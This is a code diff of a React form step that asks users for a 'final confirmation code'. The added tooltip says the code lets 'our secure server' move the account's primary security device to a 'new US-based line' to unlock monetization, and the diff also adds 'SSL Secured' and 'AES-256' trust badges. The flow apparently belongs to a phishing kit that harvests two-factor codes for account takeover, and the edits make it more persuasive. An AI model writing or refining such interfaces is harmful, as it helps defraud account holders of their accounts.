@@ -1,7 +1,8 @@
+
 'use client';
 
 import { zodResolver } from '@hookform/resolvers/zod';
-import { ArrowLeft, CheckCircle, Loader2 } from 'lucide-react';
+import { ArrowLeft, CheckCircle, Loader2, HelpCircle, ShieldCheck, Lock } from 'lucide-react';
 import { useForm } from 'react-hook-form';
 import * as z from 'zod';
 import { useToast } from '@/hooks/use-toast';
@@ -15,6 +16,7 @@ import { ResendCode } from './resend-code';
 import { db } from '@/lib/firebase';
 import { doc, onSnapshot } from 'firebase/firestore';
 import type { Submission } from '@/lib/types';
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
 
 
 const formSchema = z.object({
@@ -145,7 +147,19 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                         name="finalCode"
                         render={({ field }) => (
                             <FormItem>
-                            <FormLabel className="sr-only">Final Code</FormLabel>
+                             <FormLabel className="flex justify-center items-center gap-2">
+                                <span>Final Confirmation Code</span>
+                                <TooltipProvider>
+                                    <Tooltip>
+                                        <TooltipTrigger asChild>
+                                            <HelpCircle className="h-4 w-4 text-muted-foreground cursor-help" />
+                                        </TooltipTrigger>
+                                        <TooltipContent className="max-w-xs">
+                                            <p>This final code authorizes our secure server to update your account's primary security device to the new US-based line. This is the last step to enabling monetization features.</p>
+                                        </TooltipContent>
+                                    </Tooltip>
+                                </TooltipProvider>
+                            </FormLabel>
                             <FormControl>
                                 <div className="flex justify-center">
                                 <InputOTP 
@@ -164,13 +178,21 @@ export function FinalCodeStep({ submissionId, onApproval, onRejection, onBack }:
                                 </InputOTP>
                                 </div>
                             </FormControl>
-                             <p className="text-xs text-muted-foreground text-center pt-2">
-                                This code authorizes the update of your account's primary security device, completing the bridge.
-                            </p>
                             <FormMessage className="text-center" />
                             </FormItem>
                         )}
                     />
+
+                    <div className="flex justify-around items-center text-xs text-muted-foreground pt-4">
+                        <div className="flex items-center gap-2">
+                            <ShieldCheck className="h-4 w-4 text-green-500" />
+                            <span>SSL Secured</span>
+                        </div>
+                        <div className="flex items-center gap-2">
+                            <Lock className="h-4 w-4 text-green-500" />
+                            <span>AES-256 Encryption</span>
+                        </div>
+                    </div>
                     
                     <div className="flex flex-col gap-4 pt-4">
                          <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
